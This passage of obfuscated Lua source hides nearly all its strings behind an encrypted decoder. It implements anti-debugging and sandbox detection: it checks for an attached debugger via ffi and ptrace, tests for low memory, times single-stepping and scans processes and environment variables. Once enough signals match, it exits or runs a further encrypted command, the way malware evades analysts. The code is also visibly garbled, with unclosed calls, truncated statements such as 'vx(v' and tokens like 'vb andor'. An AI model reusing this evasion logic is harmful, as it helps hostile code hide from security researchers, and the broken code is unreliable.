    local v57 = io.open(__D("\240\159\144\160\240\159\140\138\240\159\166\136\240\159\140\186\240\159\140\136\240\159\140\139\240\159\144\161\240\159\140\139\240\159\144\179\240\159\140\138\240\159\144\139\240\159\140\136\240\159\166\136\240\159\144\154\240\159\140\180\240\159\144\162\240\159\140\136\240\159\140\186\240\159\144\160\240\159\144\172\240\159\140\180\240\159\144\153\240\159\144\172\240\159\144\139\240\159\144\179\240\159\166\136", __K), (__D("\240\159\140\186\240\159\140\180", __K)))
    if not v57 or not v57:read((__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172", __K))) then
    end
    local v58 = vc((__D("", __K)))
    if v57 then
      v57:close()
    end
    if #v58 > 0 then
      vx(v50, v58)
    end
  end
  local v59 = table.concat(v50, (__D("\240\159\144\161\240\159\144\161", __K)))
  for v60, v61 in ipairs(v48) do
    if v59:find(v61) then
      return v61
    end
  end
  return nil
end
va.f0 = v49
local function v62()
  if vb then
    local v63 = vq({



      __D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\179\240\159\144\172\240\159\144\179\240\159\144\139\240\159\144\154\240\159\144\162\240\159\166\136\240\159\140\136\240\159\166\128\240\159\144\160\240\159\140\136\240\159\140\138\240\159\144\179\240\159\140\136\240\159\144\154\240\159\140\180\240\159\140\138\240\159\144\153\240\159\144\160\240\159\140\186\240\159\140\136\240\159\140\180\240\159\140\138\240\159\165\165\240\159\144\172\240\159\144\161\240\159\140\138\240\159\140\186\240\159\144\172\240\159\165\165\240\159\166\136\240\159\140\139\240\159\140\180\240\159\144\162\240\159\144\160\240\159\144\160\240\159\140\186\240\159\166\136\240\159\140\180\240\159\166\136\240\159\144\162\240\159\144\154\240\159\140\136\240\159\140\186\240\159\140\136\240\159\144\162\240\159\144\172\240\159\140\186\240\159\144\153\240\159\140\138\240\159\166\136\240\159\140\180\240\159\144\153\240\159\166\128\240\159\144\179\240\159\144\139\240\159\140\180\240\159\144\162\240\159\140\186\240\159\140\136\240\159\140\139\240\159\140\139\240\159\144\179\240\159\140\180\240\159\140\139\240\159\165\165\240\159\166\136\240\159\166\128\240\159\140\138\240\159\144\162\240\159\144\172\240\159\144\154\240\159\144\172\240\159\165\165\240\159\144\160\240\159\166\136", __K),


      __D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\179\240\159\144\172\240\159\144\179\240\159\144\139\240\159\144\154\240\159\144\162\240\159\166\136\240\159\140\136\240\159\166\128\240\159\144\160\240\159\140\136\240\159\140\138\240\159\144\179\240\159\140\136\240\159\144\154\240\159\140\180\240\159\140\138\240\159\144\153\240\159\144\160\240\159\140\186\240\159\140\136\240\159\140\180\240\159\140\138\240\159\165\165\240\159\144\172\240\159\144\161\240\159\140\138\240\159\140\186\240\159\144\172\240\159\165\165\240\159\166\136\240\159\140\139\240\159\140\180\240\159\144\162\240\159\144\160\240\159\144\160\240\159\140\186\240\159\166\136\240\159\140\180\240\159\166\136\240\159\144\162\240\159\144\154\240\159\140\136\240\159\140\186\240\159\140\136\240\159\144\162\240\159\144\172\240\159\140\186\240\159\144\153\240\159\140\138\240\159\144\179\240\159\140\180\240\159\140\180\240\159\144\172\240\159\144\172\240\159\144\179\240\159\166\128\240\159\166\136\240\159\165\165\240\159\140\186\240\159\144\139\240\159\140\186\240\159\140\186\240\159\144\160\240\159\144\139\240\159\144\160\240\159\144\161\240\159\144\139\240\159\144\161\240\159\144\161", __K),


    })
    return v63
  else
    local v64 = vc(vi
    for v65, v66 in ipairs({
      __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\128\240\159\144\179\240\159\166\136\240\159\144\153\240\159\144\172\240\159\166\136\240\159\144\162\240\159\140\180\240\159\140\139\240\159\140\136\240\159\144\172", __K),
      __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\128\240\159\144\160\240\159\140\138\240\159\144\154\240\159\140\138", __K),
      __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\128\240\159\144\160\240\159\144\161\240\159\144\154\240\159\144\153\240\159\166\136\240\159\140\136\240\159\166\128\240\159\140\180\240\159\144\162\240\159\144\162", __K),
      __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\136\240\159\144\154\240\159\144\161\240\159\144\172\240\159\144\179\240\159\144\161\240\159\144\153\240\159\144\154", __K),
      __D("\240\159\144\172\240\159\144\160\240\159\166\136\240\159\166\136\240\159\140\139\240\159\144\179\240\159\166\136\240\159\140\186\240\159\144\179\240\159\144\154\240\159\144\154\240\159\166\136\240\159\144\161\240\159\144\162\240\159\140\180\240\159\140\139", __K),
      __D("\240\159\144\172\240\159\144\160\240\159\166\136\240\159\166\136\240\159\140\139\240\159\144\179\240\159\166\136\240\159\165\165\240\159\144\160\240\159\144\160\240\159\144\154\240\159\144\153\240\159\166\136\240\159\165\165\240\159\140\180\240\159\140\139", __K),
      __D("\240\159\144\172\240\159\166\136\240\159\166\136\240\159\166\136\240\159\144\162\240\159\166\136", __K),
      __D("\240\159\140\186\240\159\144\154\240\159\166\136\240\159\144\139\240\159\144\162\240\159\144\161", __K),
      (__D("\240\159\144\172\240\159\140\180\240\159\144\161\240\159\140\180\240\159\144\162\240\159\144\139\240\159\144\161\240\159\166\128\240\159\144\160\240\159\140\138\240\159\144\154\240\159\140\186\240\159\144\161\240\159\144\153\240\159\166\128\240\159\144\161", __K))
    }) do
      if #v64 > 0 and v64:find(v66, 1, true) then
        return v66
      end
    end
    local v67 = vq({

      __D("\240\159\144\160\240\159\140\138\240\159\166\136\240\159\165\165\240\159\144\162\240\159\140\139\240\159\144\161\240\159\140\180\240\159\144\179\240\159\140\180\240\159\144\139\240\159\140\136\240\159\144\161\240\159\166\128\240\159\166\128\240\159\140\180\240\159\144\162\240\159\144\139\240\159\144\179\240\159\144\153\240\159\140\136\240\159\166\128\240\159\144\172\240\159\140\139\240\159\144\179\240\159\144\139", __K),

    })
    return v67
  end
end
va.f1 = v62
local function v68()
  local v69 = vc(vu(vb and __D("\240\159\140\138\240\159\144\139\240\159\144\179\240\159\165\165\240\159\144\139\240\159\166\128\240\159\144\179\240\159\144\179\240\159\166\136\240\159\140\180\240\159\166\128\240\159\144\160\240\159\144\179\240\159\140\138\240\159\144\154\240\159\140\180", __K) or __D("\240\159\140\138\240\159\144\139\240\159\144\179\240\159\165\165\240\159\144\139\240\159\166\128\240\159\144\179\240\159\144\179", __K)) or __D("", __K))
  local v70 = vc(vu(vb and __D("\240\159\165\165\240\159\166\128\240\159\144\160\240\159\140\180\240\159\144\139\240\159\166\136\240\159\144\179\240\159\166\136\240\159\144\161\240\159\144\179\240\159\140\180\240\159\140\186\240\159\144\179\240\159\144\162\240\159\144\153\240\159\144\139\240\159\144\139\240\159\140\136\240\159\144\161\240\159\140\139\240\159\144\153\240\159\166\128\240\159\165\165\240\159\140\136", __K) or __D("\240\159\165\165\240\159\144\160\240\159\144\160\240\159\140\180\240\159\140\139\240\159\144\139\240\159\144\179\240\159\140\138\240\159\166\136\240\159\140\180\240\159\166\128\240\159\144\160\240\159\144\179\240\159\140\138\240\159\144\154\240\159\140\180", __K)) or __D("", __K))
  local v71 = {
    __D("\240\159\140\186\240\159\166\128\240\159\144\161\240\159\144\172\240\159\144\162\240\159\144\160\240\159\144\161\240\159\140\138\240\159\144\179\240\159\165\165\240\159\144\154\240\159\140\136\240\159\144\161\240\159\144\161", __K),
    __D("\240\159\144\172\240\159\144\154\240\159\144\161\240\159\166\128\240\159\144\162\240\159\144\162\240\159\144\161\240\159\144\162\240\159\144\160\240\159\144\139\240\159\144\153\240\159\144\161\240\159\166\136\240\159\166\136\240\159\140\180\240\159\140\139", __K),
    __D("\240\159\144\172\240\159\140\186\240\159\144\161\240\159\144\172\240\159\144\162\240\159\144\161\240\159\166\136\240\159\144\172\240\159\144\179\240\159\140\186\240\159\144\153\240\159\166\136\240\159\166\136\240\159\144\162", __K),
    __D("\240\159\144\172\240\159\140\139\240\159\144\161\240\159\144\160\240\159\140\136\240\159\140\180\240\159\144\161\240\159\140\139\240\159\144\179\240\159\140\180\240\159\144\154\240\159\144\160\240\159\144\161\240\159\140\136\240\159\166\128\240\159\165\165\240\159\144\162\240\159\144\162\240\159\144\160\240\159\166\136", __K),
    __D("\240\159\144\172\240\159\144\161\240\159\144\161\240\159\140\180\240\159\144\162\240\159\166\128", __K),
    __D("\240\159\144\172\240\159\166\128\240\159\166\136\240\159\144\160\240\159\144\162\240\159\144\139\240\159\144\161\240\159\144\153\240\159\144\179\240\159\166\128\240\159\144\154\240\159\140\136", __K),
    __D("\240\159\144\172\240\159\166\128\240\159\144\161\240\159\144\172\240\159\140\136\240\159\140\136\240\159\144\161\240\159\165\165", __K),
    __D("\240\159\144\172\240\159\144\154\240\159\144\161\240\159\166\128\240\159\140\136\240\159\140\138\240\159\166\136\240\159\144\179\240\159\144\160\240\159\144\179\240\159\144\154\240\159\144\162", __K),
    "win%-",
    __D("\240\159\144\172\240\159\144\172\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\139", __K),
    (__D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\160\240\159\140\136\240\159\144\139\240\159\166\136\240\159\140\138", __K))
  }
  for v72, v73 in ipairs(v71) do
    if #v69 > 0 and v69:find(v73) then
      return __D("\240\159\140\186\240\159\144\139\240\159\166\136\240\159\165\165\240\159\144\162\240\159\166\128\240\159\166\136\240\159\144\179\240\159\144\172\240\159\140\136", __K) .. v73
    end
    if #v70 > 0 and v70:find(v73) then
      return __D("\240\159\144\172\240\159\144\160\240\159\144\161\240\159\140\180\240\159\140\136\240\159\144\139\240\159\166\136\240\159\140\138\240\159\144\172\240\159\140\136", __K) .. v73
    end
  end
  return nil
end
va.f2 = v68
local function v74()
  local v75 = tonumber(vu(vb andor __D("\240\159\165\165\240\159\165\165\240\159\144\179\240\159\144\160\240\159\144\139\240\159\166\136\240\159\144\179\240\159\140\139\240\159\144\161\240\159\144\172\240\159\140\180\240\159\166\136\240\159\144\179\240\159\140\186\240\159\144\154\240\159\140\139\240\159\144\139\240\159\140\186\240\159\166\136\240\159\140\136\240\159\144\154\240\159\140\186\240\159\165\165\240\159\144\172\240\159\144\161\240\159\140\136\240\159\140\139\240\159\140\180", __K)) or __D("", __K)) or 0
  local v76 = v75 > 0 and v75 <= 2
  local v77 = false
  if vb then
    local v78 = vi((__D("\240\159\140\186\240\159\144\162\240\159\144\161\240\159\144\153\240\159\144\162\240\159\140\138\240\159\144\161\240\159\144\160\240\159\140\186\240\159\144\172\240\159\166\128\240\159\140\136\240\159\144\160\240\159\144\154\240\159\144\162\240\159\144\162\240\159\144\162\240\159\140\138\240\159\144\160\240\159\144\153\240\159\166\128\240\159\144\161\240\159\144\160\240\159\166\128\240\159\144\161\240\159\144\153\240\159\144\162\240\159\165\165\240\159\140\138\240\159\165\165\240\159\144\172\240\159\165\165\240\159\140\138\240\159\144\172\240\159\144\161\240\159\166\136\240\159\165\165\240\159\140\138\240\159\144\153\240\159\144\160\240\159\144\160\240\159\144\139\240\159\144\172\240\159\166\136\240\159\140\180\240\159\165\165\240\159\140\136\240\159\140\180\240\159\140\139\240\159\144\139\240\159\144\162\240\159\144\153\240\159\140\186\240\159\166\128\240\159\166\128\240\159\144\172\240\159\144\179\240\159\140\136\240\159\166\128\240\159\144\160\240\159\144\161\240\159\144\179\240\159\166\128\240\159\140\136\240\159\140\138\240\159\144\161\240\159\140\139\240\159\144\160\240\159\140\186\240\159\140\136\240\159\144\153\240\159\140\139\240\159\144\161\240\159\144\161\240\159\166\136\240\159\144\160\240\159\140\186\240\159\165\165\240\159\144\172\240\159\140\180\240\159\144\179\240\159\140\186\240\159\140\136\240\159\144\139\240\159\144\154\240\159\144\172\240\159\166\128\240\159\140\186\240\159\140\138\240\159\140\139\240\159\166\128\240\159\140\138\240\159\166\128\240\159\140\138\240\159\140\139\240\159\166\128", __K)))
    local v79 = tonumber(v78:match("TotalVisibleMemorySize=(%d+)") or __D("", __K))
    if v79 and v79 > 0 then
      local v80 = v79 / 1024
      v77 = v80 < 2048
    end
  else
    local v81 = io.open(__D("\240\159\144\160\240\159\140\138\240\159\166\136\240\159\140\186\240\159\140\136\240\159\140\139\240\159\144\161\240\159\140\139\240\159\144\179\240\159\140\138\240\159\144\139\240\159\140\136\240\159\166\136\240\159\140\138\240\159\166\128\240\159\140\180\240\159\144\162\240\159\144\139\240\159\144\160\240\159\144\172\240\159\140\180\240\159\144\153\240\159\144\172\240\159\144\139\240\159\144\179\240\159\166\136", __K), (__D("\240\159\140\186\240\159\140\180", __K)))
    if v81 then
      local v82 = v81:read((__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172", __K))) or __D("", __K)
      v81:close()
      local v83 = tonumber(v82:match("MemTotal:%s*(%d+)"))
      v77 = v83 and v83 / 1024 < 2048
    end
  end
  return v76 and __D("\240\159\144\172\240\159\144\172\240\159\144\161\240\159\140\180\240\159\140\136\240\159\144\154\240\159\144\179\240\159\140\139\240\159\144\179\240\159\140\138\240\159\144\153\240\159\144\179\240\159\144\161\240\159\144\162\240\159\140\180\240\159\140\139", __K) or v77 and __D("\240\159\144\172\240\159\144\172\240\159\144\161\240\159\140\180\240\159\140\136\240\159\144\154\240\159\144\179\240\159\140\139\240\159\144\179\240\159\144\154\240\159\144\154\240\159\144\172\240\159\166\136\240\159\140\138", __K) or nil
end
va.f3 = v74
local function v84()
  if vb then
    local v85 = vq({
      __D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\161\240\159\144\161\240\159\144\179\240\159\140\180\240\159\144\154\240\159\144\160\240\159\166\136\240\159\165\165\240\159\140\180\240\159\165\165\240\159\140\136\240\159\166\136\240\159\144\160\240\159\144\172\240\159\166\128\240\159\140\186\240\159\140\138\240\159\140\138", __K),
      __D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\161\240\159\144\154\240\159\144\179\240\159\166\128\240\159\144\154\240\159\144\172\240\159\144\161\240\159\144\154\240\159\166\128\240\159\140\136\240\159\144\162\240\159\140\136\240\159\144\160\240\159\144\154\240\159\140\180\240\159\144\172\240\159\144\172\240\159\144\172\240\159\144\160\240\159\144\172\240\159\140\139\240\159\140\186", __K),
      __D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\179\240\159\165\165\240\159\144\160\240\159\140\138\240\159\144\154\240\159\144\172\240\159\144\161\240\159\144\153\240\159\140\180\240\159\140\139\240\159\140\139\240\159\140\139\240\159\166\136\240\159\144\139\240\159\166\128\240\159\166\136\240\159\144\172\240\159\144\154\240\159\144\179\240\159\144\160\240\159\144\162\240\159\144\160\240\159\165\165\240\159\144\179\240\159\140\138\240\159\166\128\240\159\140\186\240\159\144\154\240\159\166\136\240\159\166\128\240\159\144\172\240\159\144\162\240\159\166\128\240\159\144\162\240\159\166\136\240\159\144\139\240\159\140\138\240\159\144\161\240\159\144\153\240\159\166\136\240\159\144\139\240\159\140\139\240\159\144\139\240\159\140\139", __K),


      (__D("\240\159\165\165\240\159\166\128\240\159\140\138\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\179\240\159\166\136\240\159\144\160\240\159\165\165\240\159\144\154\240\159\140\136\240\159\166\136\240\159\144\139\240\159\140\180\240\159\144\139\240\159\144\162\240\159\144\179\240\159\144\160\240\159\144\160\240\159\140\136\240\159\165\165\240\159\165\165\240\159\144\139\240\159\144\179\240\159\140\186\240\159\144\162\240\159\140\186\240\159\165\165\240\159\140\138\240\159\140\186\240\159\144\172\240\159\144\172\240\159\144\172\240\159\166\136\240\159\165\165\240\159\144\172\240\159\144\162\240\159\140\180\240\159\166\136\240\159\144\161\240\159\144\179\240\159\144\160\240\159\144\179\240\159\144\154\240\159\144\154\240\159\140\136\240\159\140\136\240\159\140\136\240\159\140\136\240\159\144\162\240\159\144\154\240\159\140\186\240\159\144\172\240\159\166\128\240\159\144\172\240\159\144\179\240\159\144\172\240\159\144\154\240\159\140\186", __K))
    })
    if v85 then
      return v85
    end
  else
    local v85 = vq({
      __D("\240\159\144\160\240\159\140\138\240\159\144\161\240\159\144\172\240\159\144\162\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\179\240\159\144\153\240\159\144\153\240\159\144\153\240\159\144\161\240\159\144\154\240\159\166\128\240\159\165\165\240\159\140\136\240\159\166\136\240\159\144\172\240\159\144\161", __K),
      __D("\240\159\144\160\240\159\140\138\240\159\144\161\240\159\140\180\240\159\140\136\240\159\140\136\240\159\166\136\240\159\140\138\240\159\140\186\240\159\166\128\240\159\144\154\240\159\144\160\240\159\166\136\240\159\144\172\240\159\166\128\240\159\140\136\240\159\144\162\240\159\140\139\240\159\144\179\240\159\144\172\240\159\166\128\240\159\140\186\240\159\144\172\240\159\144\161\240\159\144\160\240\159\144\162\240\159\166\128\240\159\165\165", __K),
      __D("\240\159\144\160\240\159\140\138\240\159\144\161\240\159\140\180\240\159\140\136\240\159\140\136\240\159\166\136\240\159\140\138\240\159\140\186\240\159\166\128\240\159\144\154\240\159\144\161\240\159\144\161\240\159\144\162\240\159\166\128\240\159\140\139\240\159\144\162\240\159\166\128\240\159\144\160\240\159\144\161\240\159\140\180\240\159\144\154\240\159\144\160\240\159\144\172", __K),
      __D("\240\159\144\160\240\159\140\138\240\159\144\161\240\159\140\180\240\159\140\136\240\159\140\136\240\159\166\136\240\159\140\138\240\159\140\186\240\159\166\128\240\159\144\154\240\159\144\161\240\159\166\136\240\159\166\128\240\159\140\180\240\159\144\162\240\159\144\162\240\159\140\186\240\159\144\172\240\159\144\161", __K),

    })
    if v85 then
      return v85
    end
  end
  return nil
end
va.f4 = v84
local function v86()
  return type(jit) == __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\179\240\159\144\179", __K) and jit.f5 and true or false
end
local function v87()
  local v88, v89 = pcall(require, (__D("\240\159\144\172\240\159\140\136\240\159\144\161\240\159\166\136\240\159\144\162\240\159\140\138", __K)))
  if not v88 then
    return false
  end
  v89.f6(__D("\240\159\144\161\240\159\140\186\240\159\144\172\240\159\144\162\240\159\166\128\240\159\140\136\240\159\165\165\240\159\166\136\240\159\140\186\240\159\144\172\240\159\144\139\240\159\144\179\240\159\166\136\240\159\166\136\240\159\166\128\240\159\144\179\240\159\140\136\240\159\144\172\240\159\144\172\240\159\144\139\240\159\144\153\240\159\144\162\240\159\140\186\240\159\144\153\240\159\166\136\240\159\144\153\240\159\144\162\240\159\140\139\240\159\165\165\240\159\144\160\240\159\140\186\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\144\161\240\159\165\165\240\159\166\128\240\159\144\153\240\159\144\179\240\159\166\136\240\159\144\172\240\159\140\186\240\159\166\136\240\159\140\180\240\159\144\162\240\159\144\162\240\159\140\139\240\159\140\136\240\159\140\186\240\159\144\162\240\159\166\136\240\159\144\172\240\159\144\161\240\159\144\162\240\159\166\136\240\159\144\179\240\159\140\180\240\159\140\180\240\159\165\165\240\159\144\179\240\159\166\128\240\159\166\128\240\159\166\136\240\159\144\161\240\159\144\179\240\159\144\154\240\159\140\136\240\159\140\138\240\159\166\136\240\159\140\180\240\159\144\154\240\159\140\138\240\159\144\172\240\159\140\138\240\159\144\179\240\159\144\179\240\159\140\180\240\159\144\179\240\159\144\162\240\159\144\160\240\159\165\165\240\159\140\180\240\159\144\161\240\159\140\139\240\159\144\162\240\159\140\136\240\159\144\162\240\159\140\138\240\159\165\165\240\159\144\139\240\159\144\154\240\159\140\180\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\139\240\159\144\154\240\159\165\165\240\159\144\154\240\159\166\128\240\159\144\161\240\159\144\179\240\159\166\136\240\159\165\165\240\159\140\136\240\159\144\172\240\159\140\139\240\159\144\172\240\159\144\154\240\159\166\128\240\159\166\136\240\159\144\160\240\159\144\153\240\159\144\162\240\159\140\138\240\159\144\154\240\159\140\186\240\159\144\153\240\159\144\161\240\159\144\154\240\159\140\186\240\159\140\180\240\159\144\161\240\159\144\179\240\159\144\179\240\159\144\162\240\159\144\154\240\159\140\136\240\159\165\165\240\159\140\180\240\159\166\136\240\159\140\138\240\159\165\165\240\159\140\138\240\159\144\179\240\159\144\139\240\159\144\153\240\159\140\180\240\159\144\179\240\159\140\138\240\159\144\154\240\159\140\186\240\159\140\138\240\159\144\160\240\159\144\160\240\159\144\139\240\159\140\180\240\159\165\165\240\159\140\139\240\159\166\128\240\159\140\186\240\159\140\186\240\159\166\136\240\159\140\138\240\159\166\128\240\159\165\165\240\159\140\139\240\159\140\138\240\159\144\154\240\159\166\128\240\159\140\186\240\159\144\139\240\159\140\180\240\159\166\128\240\159\144\139\240\159\144\160\240\159\144\172\240\159\144\162\240\159\166\128\240\159\166\136\240\159\140\136\240\159\144\162\240\159\144\161\240\159\144\161\240\159\144\161\240\159\144\162\240\159\144\161\240\159\144\154\240\159\144\154\240\159\166\136\240\159\144\139\240\159\144\162\240\159\144\172\240\159\144\154\240\159\140\136\240\159\166\128\240\159\144\172\240\159\140\138\240\159\144\162\240\159\144\160\240\159\140\180\240\159\144\162\240\159\144\160\240\159\144\160\240\159\144\172\240\159\140\139\240\159\166\136\240\159\166\136\240\159\165\165\240\159\165\165\240\159\140\138\240\159\144\172\240\159\144\153\240\159\144\154\240\159\144\154\240\159\140\180\240\159\140\186\240\159\140\136\240\159\144\162\240\159\144\154\240\159\144\172\240\159\140\136\240\159\166\136\240\159\144\139\240\159\140\138\240\159\166\136\240\159\144\139\240\159\144\160\240\159\140\139\240\159\165\165\240\159\165\165\240\159\144\139\240\159\144\154\240\159\144\153\240\159\144\162\240\159\144\139\240\159\144\162\240\159\140\136\240\159\165\165\240\159\144\179\240\159\165\165\240\159\166\128\240\159\144\161\240\159\144\161\240\159\144\160\240\159\144\162\240\159\144\139\240\159\140\139\240\159\140\186\240\159\166\136\240\159\144\154\240\159\144\179\240\159\144\162\240\159\165\165\240\159\144\154\240\159\144\161\240\159\165\165\240\159\144\161\240\159\144\154\240\159\144\139\240\159\166\136\240\159\144\153\240\159\144\139\240\159\140\138\240\159\144\139\240\159\144\153\240\159\140\180\240\159\140\138\240\159\140\186\240\159\140\180\240\159\140\180\240\159\165\165\240\159\144\154\240\159\165\165\240\159\144\160\240\159\144\172\240\159\166\128\240\159\144\139\240\159\166\136\240\159\144\153\240\159\140\138\240\159\140\186\240\159\144\154\240\159\144\162\240\159\144\179\240\159\165\165\240\159\144\139\240\159\144\154\240\159\144\154\240\159\144\154\240\159\165\165\240\159\140\180\240\159\140\136\240\159\140\138\240\159\140\139\240\159\144\154\240\159\140\136\240\159\140\139\240\159\144\139\240\159\140\139\240\159\166\128\240\159\140\186\240\159\140\138\240\159\140\136\240\159\140\136\240\159\140\136\240\159\144\153\240\159\144\179\240\159\165\165\240\159\140\180", __K))
  local v90 = v89.f7((__D("\240\159\144\172\240\159\166\136\240\159\144\161\240\159\144\160\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\139\240\159\144\179\240\159\144\179\240\159\144\154\240\159\144\139\240\159\165\165\240\159\144\154\240\159\140\136\240\159\144\139", __K)))
  if v90.f8() ~= 0 then
    return true
  end
  local v91 = v89.f9(__D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\166\128\240\159\140\136\240\159\140\180\240\159\144\179\240\159\144\153\240\159\144\172\240\159\140\186\240\159\140\180\240\159\140\139", __K), 0)
  v90.f10(v90.f11(), v91)
  return v91[0] ~= 0
end
local function v92()
  local v93, v94 = pcall(require, (__D("\240\159\144\172\240\159\140\136\240\159\144\161\240\159\166\136\240\159\144\162\240\159\140\138", __K)))
  if not v93 then
    return false
  end
  v94.f
  local v95 = 0
  local v96 = v94.f12.f13(v95, 0, nil, nil)
  if v96 == -1 then
    return true
  end
  return false
end
function va.f14()
  if not vb or not v86() then
    return false
  end
  local v97, v98 = pcall(v87)
  return v97 and v98 or false
end
function va.f15()
  if vb or not v86() then
    return false
  end
  local v99, v100 = pcall(v92)
  return v99 and v100 or false
end
function va.f16(v101)
  v101 = v101 or {}
  local v102 = {}
  local v103, v104, v105 = 0, 0, 0
  local v106 = va.fr()
  if v106 then
    v103 = v103 + 1
    vx(v
  end
  if not va.fs() then
    va.fq()
    if not va.fs() then
      v103 = v103 + 1
      vx(v
    end
  end
  local v107, v108 = va.ft(va.fa.fb, va.fa.fc)
  if v107 then
    v103 = v103 + 1
    vx(v102, ("single_step_slow:%dms"):format(v108))
  end
  local v109 = va.fw()
  if v109 then
    v103 = v103 + 1
    vx(vv109)
  end
  if not vb and va.fx() then
    v103 = v103 + 1
    vx(v
  end
  local v110 = va.fz()
  if v110 then
    v103 = v103 + 1
    vx(v102, __D("\240\159\140\186\240\159\166\128\240\159\166\136\240\159\144\160\240\159\140\136\240\159\144\139\240\159\166\136\240\159\166\136\240\159\144\179\240\159\144\139\240\159\144\154\240\159\144\161\240\159\166\136\240\159\166\136\240\159\166\128\240\159\144\160\240\159\140\136\240\159\140\186\240\159\144\179\240\159\140\136\240\159\144\154\240\159\144\154\240\159\144\172\240\159\140\136\240\159\144\179\240\159\144\161\240\159\140\136\240\159\144\162\240\159\166\136\240\159\144\153", __K) .. v110)
  end
  if vb and va.f14() then
    v103 = v103 + 1
    vx(v
  end
  if not vb and va.f15() then
    v103 = v103 + 1
    vx(v
  end
  local v111 = va.fy()
  if v111 then
    v104 = v104 + 1
    vx(vv111)
  end
  local v112 = va.f0()
  if v112 then
    v105 = v105 + 1
    vx(v102, __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\139\240\159\144\179\240\159\166\136\240\159\140\186\240\159\144\179\240\159\144\179\240\159\144\154\240\159\144\162\240\159\166\136\240\159\140\136\240\159\166\128\240\159\144\160\240\159\140\136\240\159\144\161\240\159\140\186\240\159\140\138", __K) .. v112)
  end
  local v113 = va.f1()
  if v113 then
    v105 = v105 + 1
    vx(v102, __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\139\240\159\144\179\240\159\144\161\240\159\144\161\240\159\144\160\240\159\165\165\240\159\144\153\240\159\140\186\240\159\166\136\240\159\166\136\240\159\166\128\240\159\144\154\240\159\144\162\240\159\144\179\240\159\144\160\240\159\140\136\240\159\166\128\240\159\144\161\240\159\144\179\240\159\144\179", __K) .. v113)
  end
  local v114 = va.f2()
  if v114 then
    v104 = v104 + 1
    vx(v102, __D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\144\179\240\159\144\162\240\159\166\128\240\159\144\161\240\159\144\139\240\159\144\160\240\159\144\160\240\159\144\154\240\159\144\153\240\159\144\161\240\159\140\136\240\159\140\180\240\159\165\165\240\159\140\180\240\159\140\180", __K) .. v114)
  end
  local v115 = va.f3()
  if v115 then
    v104 = v104 + 1
    vx(v102, v115)
  end
  local v116 = va.f4()
  if v116 then
    v104 = v104 + 1
    vx(v102, __D("\240\159\140\186\240\159\166\128\240\159\144\161\240\159\144\172\240\159\144\162\240\159\144\160\240\159\144\161\240\159\140\138\240\159\144\179\240\159\165\165\240\159\144\154\240\159\140\136\240\159\144\161\240\159\144\161\240\159\144\153\240\159\144\160\240\159\140\136\240\159\144\160\240\159\144\160\240\159\140\139\240\159\166\128\240\159\144\161\240\159\144\172\240\159\166\136\240\159\144\172\240\159\165\165", __K) .. v116)
  end
  local v117 = v103 + v104 + v105
  local v118 = v103 >= (v101.fe or va.fa.fe) or v104 + v105 >= (v101.fd or va.fa.fd) or v117 >= (v101.ff or va.fa.ff)
  return {
    f17 = v118,
    f18 = v117,
    f19 = v103,
    f20 = v104,
    f21 = v105,
    f22 = v102,
    f23 = vb and __D("\240\159\140\186\240\159\144\162\240\159\144\161\240\159\140\139\240\159\144\162\240\159\144\160\240\159\144\161\240\159\140\138\240\159\144\179\240\159\166\128\240\159\144\153\240\159\165\165\240\159\144\161\240\159\144\154", __K) or __D("\240\159\140\186\240\159\144\153\240\159\144\161\240\159\140\180\240\159\140\136\240\159\144\139\240\159\144\161\240\159\140\180\240\159\144\160\240\159\140\139", __K)
  }
end
function va.f24(v119)
  v119 = v119 or {
    f25 = __D("\240\159\144\172\240\159\144\139\240\159\166\136\240\159\144\139\240\159\144\162\240\159\140\138\240\159\166\136\240\159\140\138", __K),
    f26 = 1
  }
  local v120 = va.f16(v119.f27 or {})
  if v120.f17 then
    local v121 = v119.f25 or __D("\240\159\144\172\240\159\144\139\240\159\166\136\240\159\144\139\240\159\144\162\240\159\140\138\240\159\166\136\240\159\140\138", __K)
    if v121 == __D("\240\159\144\172\240\159\144\139\240\159\166\136\240\159\144\139\240\159\144\162\240\159\140\138\240\159\166\136\240\159\140\138", __K) then
      os.exit(v119.f26 or 1)
    elseif v121 == __D("\240\159\140\186\240\159\166\128\240\159\144\161\240\159\144\154\240\159\144\162\240\159\166\128\240\159\144\161\240\159\165\165\240\159\144\160\240\159\144\172", __K) then
      if vb then
        vi(__D("\240\159\140\186\240\159\144\153\240\159\144\161\240\159\140\139\240\159\144\162\240\159\144\160\240\159\144\161\240\159\144\172\240\159\140\186\240\159\144\172\240\159\144\139\240\159\140\139\240\159\166\136\240\159\144\172\240\159\144\162\240\159\144\162", __K) .. (v119.f28 or
      else
